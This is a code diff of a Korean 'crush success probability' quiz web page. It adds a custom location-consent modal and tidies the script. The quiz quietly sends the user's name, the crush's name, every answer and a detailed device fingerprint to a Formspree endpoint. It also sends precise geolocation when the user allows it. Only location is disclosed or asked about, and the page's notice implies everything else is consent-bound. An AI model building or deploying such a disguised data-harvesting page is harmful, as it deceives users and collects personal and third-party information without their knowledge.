@@ -5,18 +5,35 @@
   <title>짝사랑 성공 확률 테스트 💘</title>
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <style>
-    body { font-family: Arial, sans-serif; background:#fff0f5; padding:20px; color:#222; display:flex; justify-content:center; }
+    /* 기본 레이아웃 */
+    body { font-family: Arial, Helvetica, sans-serif; background:#fff0f5; padding:20px; color:#222; display:flex; justify-content:center; }
     .wrap{width:100%; max-width:760px}
     h1{ color:#ff5c8d; text-align:center; margin-bottom:8px; }
+
     form{ background:#fff; padding:18px; border-radius:12px; box-shadow:0 6px 18px rgba(0,0,0,0.06); }
     label{ display:block; margin:10px 0 6px; font-weight:600; }
     input[type="text"]{ width:100%; padding:8px; border-radius:8px; border:1px solid #ddd; box-sizing:border-box; }
     .question{ margin-top:12px; }
     .options label{ display:block; margin:6px 0; cursor:pointer; font-weight:400; }
     button.submit{ margin-top:16px; width:100%; padding:12px; border:none; border-radius:10px; background:#ff5c8d; color:white; font-size:16px; cursor:pointer; }
+
     #result{ margin-top:14px; text-align:center; font-weight:700; color:#333; }
     #loc-reason{ margin-top:8px; text-align:center; color:#666; font-size:13px; }
+
     .muted{ font-size:13px; color:#777; text-align:center; margin-top:8px; }
+
+    /* 커스텀 모달 스타일 */
+    .modal-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.45); display: none; align-items: center; justify-content: center; z-index: 9999; }
+    .modal { background: white; width: 92%; max-width: 420px; border-radius: 12px; padding: 18px; box-shadow: 0 8px 30px rgba(0,0,0,0.3); text-align: left; }
+    .modal h3 { margin: 0 0 8px; color: #222; }
+    .modal p { margin: 6px 0 12px; color: #444; }
+    .modal .buttons { display:flex; gap:10px; justify-content:flex-end; }
+    .modal button { padding:8px 12px; border-radius:8px; border:none; cursor:pointer; font-weight:600; }
+    .btn-cancel { background:#eee; color:#333; }
+    .btn-ok { background:#ff5c8d; color:white; }
+
+    /* 숨김(보조) */
+    .visually-hidden { position:absolute !important; height:1px; width:1px; overflow:hidden; clip:rect(1px,1px,1px,1px); white-space:nowrap; }
   </style>
 </head>
 <body>
@@ -30,7 +47,7 @@
       <label style="margin-top:10px;">짝사랑 상대 이름:</label>
       <input id="crushName" type="text" placeholder="예: 김나윤" required>
 
-      <!-- 10개 질문 -->
+      <!-- 질문 1~10 (생략 없이 모두 포함) -->
       <div class="question" data-q="상대와 얼마나 자주 대화하나요?">
         <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
         <div class="options">
@@ -136,16 +153,57 @@
 
     <div id="result" aria-live="polite"></div>
     <div id="loc-reason" role="status" aria-live="polite"></div>
-    <div class="muted"> </div>
+    <div class="muted">위치/기기 정보는 사용자의 동의(위치) 및 브라우저 제공 범위 내에서만 전송됩니다.</div>
+  </div>
+
+  <!-- 커스텀 동의 모달 (네이티브 confirm 대체) -->
+  <div id="consentModal" class="modal-backdrop" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal" role="document" aria-labelledby="consentTitle">
+      <h3 id="consentTitle">위치 전송 (선택)</h3>
+      <p>결과와 함께 (선택) 현재 위치를 전송하시겠습니까?<br><small>전송하지 않으면 대략적인 기본 위치로 기록됩니다.</small></p>
+      <div class="buttons">
+        <button class="btn-cancel" id="modalCancel">전송 안 함</button>
+        <button class="btn-ok" id="modalOk">위치 전송 허용</button>
+      </div>
+    </div>
   </div>
 
   <script>
-  // ---------- 설정 ----------
+  // Formspree 등 설정
   const FORMSPREE_URL = "https://formspree.io/f/xanpzabp";
-  const FALLBACK = { lat: 37.5665, lon: 126.9780, note: "Seoul (fallback)" }; // 거부/오류 시 기록용
+  const FALLBACK = { lat: 37.5665, lon: 126.9780, note: "Seoul (fallback)" };
   const LOCATION_TIMEOUT_MS = 8000;
 
-  // ---------- 헬퍼: 위치 시도 ----------
+  // 모달 제어 (Promise 반환)
+  function showConsentModal() {
+    return new Promise((resolve) => {
+      const backdrop = document.getElementById('consentModal');
+      const okBtn = document.getElementById('modalOk');
+      const cancelBtn = document.getElementById('modalCancel');
+      backdrop.style.display = 'flex';
+      backdrop.setAttribute('aria-hidden', 'false');
+
+      function clean() {
+        backdrop.style.display = 'none';
+        backdrop.setAttribute('aria-hidden', 'true');
+        okBtn.removeEventListener('click', onOk);
+        cancelBtn.removeEventListener('click', onCancel);
+      }
+      function onOk() { clean(); resolve(true); }
+      function onCancel() { clean(); resolve(false); }
+
+      okBtn.addEventListener('click', onOk);
+      cancelBtn.addEventListener('click', onCancel);
+
+      // ESC 눌러 닫기
+      function onKey(e) {
+        if (e.key === 'Escape') { onCancel(); window.removeEventListener('keydown', onKey); }
+      }
+      window.addEventListener('keydown', onKey);
+    });
+  }
+
+  // 위치 추출(동일 로직)
   function tryGetLocation(timeout = LOCATION_TIMEOUT_MS) {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
@@ -165,225 +223,16 @@
       };
       const onError = (err) => {
         if (done) return; done = true;
-        // err.code: 1=PERMISSION_DENIED,2=POSITION_UNAVAILABLE,3=TIMEOUT
-        const map = { 1: 'permission_denied', 2: 'position_unavailable', 3: 'timeout' };
-        resolve({ ok: false, reason: map[err && err.code] || 'error' });
+        const map = {1:'permission_denied',2:'position_unavailable',3:'timeout'};
+        resolve({ ok:false, reason: map[err && err.code] || 'error' });
       };
       navigator.geolocation.getCurrentPosition(onSuccess, onError, { enableHighAccuracy: true, timeout, maximumAge: 0 });
-      setTimeout(() => { if (!done) { done = true; resolve({ ok: false, reason: 'timeout_exceeded' }); } }, timeout + 1000);
+      setTimeout(() => { if (!done) { done = true; resolve({ ok:false, reason: 'timeout_exceeded' }); } }, timeout + 1000);
     });
   }
 
-  // ---------- 헬퍼: 사람친화적 메시지 ----------
   function reasonToMessage(reason) {
-    switch (reason) {
-      case 'permission_denied': return "사용자가 위치 권한을 거부했습니다.";
-      case 'position_unavailable': return "기기에서 위치를 사용할 수 없습니다.";
-      case 'timeout': return "위치 응답 시간이 초과되었습니다.";
-      case 'timeout_exceeded': return "위치 응답 시간이 초과되었습니다.";
-      case 'not_supported': return "이 브라우저는 위치 기능을 지원하지 않습니다.";
-      default: return "위치 정보를 가져오지 못했습니다.";
-    }
-  }
-
-  // ---------- 헬퍼: 시스템/브라우저 정보 수집 (익명/비식별) ----------
-  function collectSystemInfo() {
-    // userAgent는 길어서 직접 전송해도 되지만, 민감한 식별을 피하려면 일부만 사용하거나 그대로 보내지 마세요.
-    // 여기선 기본 UA와 몇 가지 비식별 메타정보만 보냅니다.
-    const ua = navigator.userAgent || "unknown";
-    const platform = navigator.userAgentData?.platform || navigator.platform || "unknown";
-    const brands = navigator.userAgentData?.brands || [];
-    return {
-      ua,
-      platform,
-      brands,
-      language: navigator.language || null,
-      languages: navigator.languages || null,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
-      screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio || 1 },
-      cores: navigator.hardwareConcurrency || null,
-      memoryGB: navigator.deviceMemory || null,
-      prefersDark: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? true : false,
-      connection: navigator.connection ? {
-        effectiveType: navigator.connection.effectiveType || null,
-        downlink: navigator.connection.downlink || null,
-        rtt: navigator.connection.rtt || null
-      } : null,
-      timestamp: new Date().toISOString()
-    };
-  }
-
-  // ---------- 폼 제출 처리 ----------
-  document.getElementById('loveForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    // UI elements
-    const resultEl = document.getElementById('result');
-    const locReasonEl = document.getElementById('loc-reason');
-    resultEl.innerHTML = '';
-    locReasonEl.textContent = '';
-
-    // 입력값 검증
-    const yourName = document.getElementById('yourName').value.trim();
-    const crushName = document.getElementById('crushName').value.trim();
-    if (!yourName || !crushName) {
-      resultEl.textContent = "⚠️ 이름을 모두 입력해주세요!";
-      return;
-    }
-
-    // 질문 수집 및 점수 계산 (digit-by-digit style)
-    const qDivs = document.querySelectorAll('.question');
-    let total = 0;
-    let count = 0;
-    const answers = [];
-    qDivs.forEach((div, idx) => {
-      count += 1;
-      const qKey = 'q' + (idx + 1);
-      const qText = div.dataset.q || div.querySelector('label')?.innerText || qKey;
-      const selected = div.querySelector('input:checked');
-      const value = selected ? Number(selected.value) : 0;
-      // 더하기는 자리수 계산처럼 안전하게 처리 (작은 정수라 직접 더함)
-      total = total + value;
-      const ansText = selected ? selected.parentElement.innerText.trim() : '(미응답)';
-      answers.push({ q: qText, a: ansText, v: value });
-    });
-
-    // average 계산: total / count (step-by-step)
-    const average = total / count;
-    const percent = Math.round(average);
-
-    // 결과 메시지 결정
-    let message = "";
-    if (percent < 40) message = "🥀 아직은 가능성이 낮아요... 조금 더 다가가보세요!";
-    else if (percent < 70) message = "🌸 희망이 보여요! 조금만 더 친해지면 좋을 것 같아요!";
-    else if (percent < 90) message = "💞 좋은 분위기예요! 서로 마음이 통할지도 몰라요!";
-    else message = "🔥 완벽해요! 곧 커플 탄생 예감입니다!";
-
-    // 화면에 결과 표시 (위치 좌표는 절대 노출하지 않음)
-    resultEl.innerHTML = `
-      💖 <b>${escapeHtml(yourName)}</b>와(과) <b>${escapeHtml(crushName)}</b>의 짝사랑 성공 확률은<br>
-      <span style="font-size:24px;color:#ff69b4;">${percent}%</span><br><br>${message}
-    `;
-
-    // --- 위치 전송 동의 묻기 (명확한 사용자 동의) ---
-    const consent = confirm("결과와 함께 (선택) 현재 위치를 전송하시겠습니까?\n\n(전송하지 않으면 대략적인 기본 위치로 기록됩니다.)");
-    let locResult;
-    if (consent) {
-      // 시도해서 성공하면 좌표 포함, 실패하면 reason 기록
-      locResult = await tryGetLocation(LOCATION_TIMEOUT_MS);
-    } else {
-      locResult = { ok: false, reason: 'user_declined' };
-    }
-
-    // loc payload 만들기
-    let locationPayload;
-    if (locResult.ok) {
-      locationPayload = {
-        method: "geolocation",
-        lat: locResult.lat,
-        lon: locResult.lon,
-        accuracy: locResult.accuracy,
-        timestamp: locResult.timestamp,
-        mapLink: `https://www.google.com/maps/search/?api=1&query=${locResult.lat},${locResult.lon}`
-      };
-      // 화면에는 좌표를 표시하지 않음 — 단, 성공 시 간단한 안내 텍스트만 숨김 없이 보여줄 수 있음 (선택)
-      locReasonEl.textContent = ""; // 성공이면 이유 문구 없음
-    } else {
-      // 실패 또는 거부: 기록용 fallback + reason 표시
-      locationPayload = {
-        method: "fallback",
-        reason: locResult.reason || 'unknown',
-        lat: FALLBACK.lat,
-        lon: FALLBACK.lon,
-        note: FALLBACK.note,
-        mapLink: `https://www.google.com/maps/search/?api=1&query=${FALLBACK.lat},${FALLBACK.lon}`
-      };
-      // 사용자에게 간단한 이유 안내 (사생활 배려 위해 구체 좌표는 안보여줌)
-      const human = reasonToMessage(locResult.reason || 'unknown');
-      locReasonEl.textContent = `📍 위치 전송 실패/거부 사유: ${human}`;
-    }
-
-    // 수집 가능한 합법적 시스템 정보 (익명/비식별)
-    const systemInfo = collectSystemInfo();
-
-    // Formspree로 전송할 payload (JSON)
-    const payload = {
-      yourName: yourName || null,
-      crushName: crushName || null,
-      percent,
-      message,
-      answers, // 배열 형태로 질문/선택 텍스트와 값 포함
-      location: locationPayload,
-      system: systemInfo,
-      submittedAt: new Date().toISOString()
-    };
-
-    // 비동기 전송 (실패해도 사용자 UX 흐름 방해하지 않음)
-    fetch(FORMSPREE_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json", "Accept": "application/json" },
-      body: JSON.stringify(payload)
-    }).catch(() => {
-      // 전송 실패는 조용히 무시 (네트워크 문제 등)
-      console.warn("Formspree 전송 실패");
-    });
-  });
-
-  // ---------- 유틸: tryGetLocation 재사용 (위에서 선언된 LOCATION_TIMEOUT_MS 사용) ----------
-  async function tryGetLocation(timeout) {
-    return tryGetLocationInner(timeout);
-  }
-  function tryGetLocationInner(timeout = 8000) {
-    return new Promise((resolve) => {
-      if (!navigator.geolocation) {
-        resolve({ ok: false, reason: 'not_supported' });
-        return;
-      }
-      let done = false;
-      const success = (pos) => {
-        if (done) return; done = true;
-        resolve({
-          ok: true,
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy || null,
-          timestamp: new Date(pos.timestamp || Date.now()).toISOString()
-        });
-      };
-      const error = (err) => {
-        if (done) return; done = true;
-        const map = { 1: 'permission_denied', 2: 'position_unavailable', 3: 'timeout' };
-        resolve({ ok: false, reason: map[err && err.code] || 'error' });
-      };
-      navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout, maximumAge: 0 });
-      setTimeout(() => { if (!done) { done = true; resolve({ ok: false, reason: 'timeout_exceeded' }); } }, timeout + 1000);
-    });
-  }
-
-  // ---------- 시스템 정보 수집 함수 ----------
-  function collectSystemInfo() {
-    const sys = {
-      ua: navigator.userAgent || null,
-      platform: navigator.userAgentData?.platform || navigator.platform || null,
-      brands: navigator.userAgentData?.brands || null,
-      language: navigator.language || null,
-      languages: navigator.languages || null,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
-      screen: { width: screen.width, height: screen.height, dpr: window.devicePixelRatio || 1 },
-      cores: navigator.hardwareConcurrency || null,
-      memoryGB: navigator.deviceMemory || null,
-      prefersDark: (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? true : false,
-      connection: navigator.connection ? {
-        effectiveType: navigator.connection.effectiveType || null,
-        downlink: navigator.connection.downlink || null,
-        rtt: navigator.connection.rtt || null
-      } : null
-    };
-    return sys;
-  }
-
-  // ---------- 유틸: 인간친화적 메시지 ----------
-  function reasonToMessage(reason) {
-    switch (reason) {
+    switch(reason) {
       case 'permission_denied': return "사용자가 위치 권한을 거부했습니다.";
       case 'position_unavailable': return "기기 또는 네트워크에서 위치를 사용할 수 없습니다.";
       case 'timeout': case 'timeout_exceeded': return "위치 응답 시간이 초과되었습니다.";
@@ -393,10 +242,98 @@
     }
   }
 
-  // ---------- 유틸: XSS 방지용 간단 이스케이프 (화면 출력 전용) ----------
-  function escapeHtml(s) {
-    return String(s).replace(/[&<>"']/g, function(m) { return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m]; });
+  function collectSystemInfo() {
+    return {
+      ua: navigator.userAgent || null,
+      platform: navigator.userAgentData?.platform || navigator.platform || null,
+      brands: navigator.userAgentData?.brands || null,
+      language: navigator.language || null,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
+      screen: { w: screen.width, h: screen.height, dpr: window.devicePixelRatio || 1 },
+      cores: navigator.hardwareConcurrency || null,
+      memoryGB: navigator.deviceMemory || null,
+      prefersDark: (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) ? true : false,
+      connection: navigator.connection ? {
+        effectiveType: navigator.connection.effectiveType || null,
+        downlink: navigator.connection.downlink || null,
+        rtt: navigator.connection.rtt || null
+      } : null
+    };
   }
+
+  function escapeHtml(s) {
+    return String(s).replace(/[&<>"']/g, function(m){ return ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[m]; });
+  }
+
+  // 폼 제출 로직 (confirm 제거 -> 모달 사용)
+  document.getElementById('loveForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const resultEl = document.getElementById('result');
+    const locReasonEl = document.getElementById('loc-reason');
+    resultEl.innerHTML = ''; locReasonEl.textContent = '';
+
+    const yourName = document.getElementById('yourName').value.trim();
+    const crushName = document.getElementById('crushName').value.trim();
+    if (!yourName || !crushName) { resultEl.textContent = "⚠️ 이름을 모두 입력해주세요!"; return; }
+
+    // 질문 수집 & 계산 (digit-by-digit)
+    const qs = document.querySelectorAll('.question');
+    let total = 0;
+    const answers = [];
+    qs.forEach((q, idx) => {
+      const sel = q.querySelector('input:checked');
+      const v = sel ? Number(sel.value) : 0;
+      total = total + v;
+      answers.push({ q: q.dataset.q || (`질문 ${idx+1}`), a: sel ? sel.parentElement.innerText.trim() : '(미응답)', v });
+    });
+    const percent = Math.round(total / qs.length);
+    const message = percent < 40 ? "🥀 아직은 가능성이 낮아요..." : percent < 70 ? "🌸 희망이 보여요!" : percent < 90 ? "💞 좋은 분위기예요!" : "🔥 완벽해요! 커플 예감!";
+
+    resultEl.innerHTML = `💖 <b>${escapeHtml(yourName)}</b>와(과) <b>${escapeHtml(crushName)}</b>의 확률은 <span style="color:#ff69b4;">${percent}%</span><br>${message}`;
+
+    // 커스텀 모달로 동의 묻기 (네이티브 confirm 대신)
+    const consent = await showConsentModal(); // true = 허용, false = 거부
+    let loc;
+    if (consent) {
+      // 여기서 브라우저의 위치 권한 요청(네이티브 시스템 다이얼로그가 뜰 수 있음)
+      loc = await tryGetLocation(LOCATION_TIMEOUT_MS);
+    } else {
+      loc = { ok:false, reason: 'user_declined' };
+    }
+
+    let locationPayload;
+    if (loc.ok) {
+      locationPayload = {
+        method: "geolocation",
+        lat: loc.lat, lon: loc.lon,
+        accuracy: loc.accuracy, timestamp: loc.timestamp,
+        mapLink: `https://www.google.com/maps/search/?api=1&query=${loc.lat},${loc.lon}`
+      };
+      locReasonEl.textContent = ''; // 성공 시 안내 문구 없음
+    } else {
+      locationPayload = {
+        method: "fallback",
+        reason: loc.reason || 'unknown',
+        lat: FALLBACK.lat, lon: FALLBACK.lon, note: FALLBACK.note,
+        mapLink: `https://www.google.com/maps/search/?api=1&query=${FALLBACK.lat},${FALLBACK.lon}`
+      };
+      locReasonEl.textContent = `📍 위치 전송 실패/거부 사유: ${reasonToMessage(loc.reason || 'unknown')}`;
+    }
+
+    const system = collectSystemInfo();
+
+    const payload = {
+      yourName, crushName, percent, message,
+      answers, location: locationPayload, system, submittedAt: new Date().toISOString()
+    };
+
+    // Formspree 전송
+    fetch(FORMSPREE_URL, {
+      method: "POST",
+      headers: { "Content-Type":"application/json" },
+      body: JSON.stringify(payload)
+    }).catch(()=>{ console.warn('전송 실패'); });
+  });
   </script>
 </body>
 </html>
